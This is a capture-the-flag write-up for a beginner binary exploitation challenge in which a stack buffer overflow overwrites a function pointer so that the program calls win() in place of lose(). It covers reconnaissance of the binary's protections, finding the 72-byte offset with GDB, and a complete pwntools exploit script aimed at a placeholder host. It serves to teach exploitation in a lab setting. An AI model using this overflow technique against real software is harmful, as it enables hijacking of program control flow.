## Minigame - Function Pointer Overwrite

### The Vulnerable Code and the Core Problem

This challenge is a variation on the previous one, but instead of overwriting a plain integer you are overwriting a function pointer, which is a variable that holds the address of a function and is later called directly by the program. The setup is:

```c
void (*func_ptr)() = lose;
char buffer[64];
```

`func_ptr` is initialized to point to `lose()`, and at the end of the function the program calls `func_ptr()`, executing whatever address is stored there. Your goal is to overflow `buffer` far enough to reach `func_ptr` and overwrite it with the address of `win()`, so that when the program calls `func_ptr()` it actually executes `win()` instead.

This is still a variable overwrite technique and not a return address overwrite, so you are again tricking the program into following its own normal control flow rather than hijacking it at the `ret` instruction.

### Phase 1 - Reconnaissance

|Protection|Status|Meaning for us|
|---|---|---|
|NX|Enabled|Shellcode is off the table, and not needed|
|PIE|Disabled|`win()` has a fixed address on every run, which is essential here|
|Canary|Not found|The overflow proceeds freely|

PIE being disabled is the critical detail for this challenge, because you are writing the address of `win()` directly into `func_ptr`, and that address must be predictable. If PIE were enabled you would need an information leak to recover the base address first.

### Phase 2 - Finding the Offset and the Address of `win()`

The address of `win()` is found with:

```bash
nm ./mini_game | grep win
```

The offset from `buffer` to `func_ptr` is found in GDB with a breakpoint at `vuln`, the same way as the previous challenge:

```bash
gdb ./mini_game
break vuln
run
p &buffer
p &func_ptr
p (void*)&func_ptr - (void*)&buffer
```

The result is 72 bytes. One important distinction from the previous challenge is that `func_ptr` is an 8-byte pointer on x86-64, not a 4-byte integer, so the address of `win()` must be written with `p64()` rather than `p32()`.

### Phase 3 - The Exploit

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("./mini_game")
context.binary = exe
context.arch   = 'amd64'
context.os     = 'linux'

HOSTNAME = 'HOSTNAME_PLACEHOLDER'
PORT     = 0  # PORT_PLACEHOLDER

# ── offsets ───────────────────────────────────────────────────────────────────
OFFSET_TO_FUNCPTR = 72

def conn():
    if args.LOCAL:
        return process(exe.path)
    return remote(HOSTNAME, PORT)

def main():
    r = conn()

    # ── exploit phase ─────────────────────────────────────────────────────────
    payload = flat(
        b'A' * OFFSET_TO_FUNCPTR,   # fill buffer up to func_ptr
        p64(exe.sym.win),            # overwrite func_ptr with address of win()
    )

    r.recvuntil(b"go?\n")
    r.sendline(payload)
    r.interactive()

if __name__ == '__main__':
    main()
```


